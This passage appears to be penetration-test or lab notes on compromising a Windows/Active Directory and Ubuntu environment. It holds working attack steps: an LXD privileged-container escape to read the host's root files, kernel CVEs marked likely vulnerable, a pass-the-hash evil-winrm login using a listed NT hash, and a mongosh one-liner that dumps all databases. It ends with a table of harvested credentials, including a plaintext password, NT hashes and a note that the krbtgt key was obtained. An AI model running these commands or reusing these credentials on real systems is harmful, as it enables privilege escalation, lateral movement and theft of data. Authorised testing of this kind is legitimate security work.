### MEDIUM — ubuntu user in `lxd` group

If we can su to `ubuntu` (try `alfpass123`):

```bash
su - ubuntu   # try password: alfpass123
# If successful:
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Read: cat /mnt/root/root/rag_service/documents/MC1_password_reset.pdf
```

### MEDIUM — Kernel CVEs

| CVE | Name | Status |
|-----|------|--------|
| CVE-2026-43284 | Dirty Frag xfrm-ESP | LIKELY VULNERABLE |
| CVE-2026-43500 | Dirty Frag rxrpc | LIKELY VULNERABLE |
| CVE-2026-46331 | pedit COW | Potentially vulnerable |
| CVE-2026-46333 | ptrace exit-race | Mitigated (ptrace_scope=1) |

### NOT EXPLOITABLE (confirmed)

- Docker socket: `srw-rw----` — `ts_svc` not in `docker` group
- sudo: No entries for `ts_svc`
- SUID binaries: Only standard system binaries
- Python3 capabilities: None

---

## Remaining Objectives

| Goal | Status | Path |
|------|--------|------|
| Ubuntu Root | Pending | Pack2TheRoot CVE-2026-41651 |
| Read `/root/rag_service/` | Pending | Requires root on Ubuntu |
| Password Reset PDF | Pending | Read after root escalation |
| Web Portal Login | Pending | Dump MongoDB on SRV1 |

---

## MongoDB Dump Command (run in evil-winrm on SRV1)

```powershell
# Connect to SRV1:
evil-winrm -i 192.168.195.14 -u Administrator -H 4309f10ed11d9a6c42b2ed50e8689f7c

# Then in the shell:
& "C:\Program Files\MongoDB\Server\7.0\bin\mongosh.exe" --quiet --eval "db.adminCommand({listDatabases:1}).databases.forEach(function(d){var m=db.getSiblingDB(d.name);m.getCollectionNames().forEach(function(c){m[c].find().forEach(function(o){print(d.name+'|'+c+'|'+JSON.stringify(o))})})})"
```

---

## Credential Summary

| System | Username | Credential | Source |
|--------|----------|-----------|--------|
| Windows local | Administrator | `alfpass123` | Unattend.xml |
| Windows local | Administrator | NT:`4309f10ed11d9a6c42b2ed50e8689f7c` | SAM dump |
| Active Directory | Administrator | NT:`24980fd4a81850180dee74d82fe4d3e3` | secretsdump |
| AD | krbtgt | AES256 obtained | secretsdump |
| Ubuntu .12 | ts_svc | SSH key from SRV1 | id_rsa |
| Research Portal | UNKNOWN | UNKNOWN | MongoDB not dumped yet |

```